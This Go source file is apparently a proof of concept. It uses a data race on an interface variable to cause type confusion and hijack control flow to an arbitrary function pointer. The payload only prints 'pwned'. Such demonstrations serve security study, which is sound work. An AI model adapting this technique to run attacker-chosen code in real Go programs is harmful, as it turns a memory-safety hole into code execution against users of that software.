package main

import(
	"go.andmed.org/gopwn"
)

type hack interface {
	X() bool
}

type iStruct struct {
	i *uintptr
}

type fStruct struct {
	f func() bool
}

func(self *iStruct) X() bool {
	return false
}

func(self *fStruct) X() bool {
	if self.f != nil {
		return self.f()
	}
	return false
}

func main() {
	println("start")
	var confused hack

	var payloadFn = func() bool {
		println("pwned")
		return true
	}
	payloadPtr := gopwn.AddressFmt(payloadFn)
	var bad = &iStruct{
		i : &payloadPtr,
	}
	var good = &fStruct{}

	confused = good

	go func() {
		var i int
		for i < 100000 {
			confused = bad
			func() {
				if i >= 0 {
					return
				}
				println(confused) // never goes here
			}()
			confused = good
			i++
		}
	}()

	for !confused.X() {
	}
}
